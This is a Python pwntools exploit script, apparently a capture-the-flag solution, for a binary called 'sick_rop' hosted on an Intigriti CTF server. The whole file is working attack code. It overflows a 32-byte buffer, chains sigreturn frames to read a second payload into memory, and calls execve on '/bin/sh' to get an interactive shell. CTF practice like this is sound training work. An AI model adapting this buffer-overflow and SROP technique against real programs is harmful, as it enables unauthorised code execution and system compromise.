from pwn import *

gs = '''
break *input+114
continue
'''

elf = context.binary = ELF("./sick_rop")

def start():
    if args.REMOTE:
        return remote("hidden.ctf.intigriti.io", 1337)
        #return remote("127.0.0.1", 1027)
    else:
        if args.GDB:
            return gdb.debug(elf.path, gdbscript=gs)
        else:
            return process(elf.path)

context.terminal = ['gnome-terminal', '-e']
context.arch = "amd64"

io = start()

rop = ROP(elf)

data = 0x40000 + 32
main = elf.sym.vuln
syscall_ret = rop.find_gadget(['syscall'])[0]


# frame to call execve

frame2 = SigreturnFrame(arch="amd64", kernel="amd64")
frame2.rax = 59
frame2.rdi = data # rdi = binsh_ptr
frame2.rsi = 0
frame2.rdx = 0
frame2.rip = syscall_ret

payload_2 = b"".join([
    b"/bin/sh\x00",
    p64(main),
    p64(syscall_ret),
    bytes(frame2)
])

# Create a frame to read into .bss
frame = SigreturnFrame(arch="amd64", kernel="amd64")
frame.rax = 0 # rax = 0 => read
frame.rdi = 0 # rdi = fd = 0 => stdin
frame.rsi = data # rsi => buff
frame.rdx = len(payload_2)
frame.rsp = data + 8
frame.rip = syscall_ret

payload = b"".join([
    b"A"*32,
    b"B"*8,
    p64(main),
    p64(syscall_ret),
    bytes(frame)
])

io.send(payload)
io.send("X"*15)
io.sendafter("X"*15, payload_2)
#io.send("Y"*15)

io.interactive()
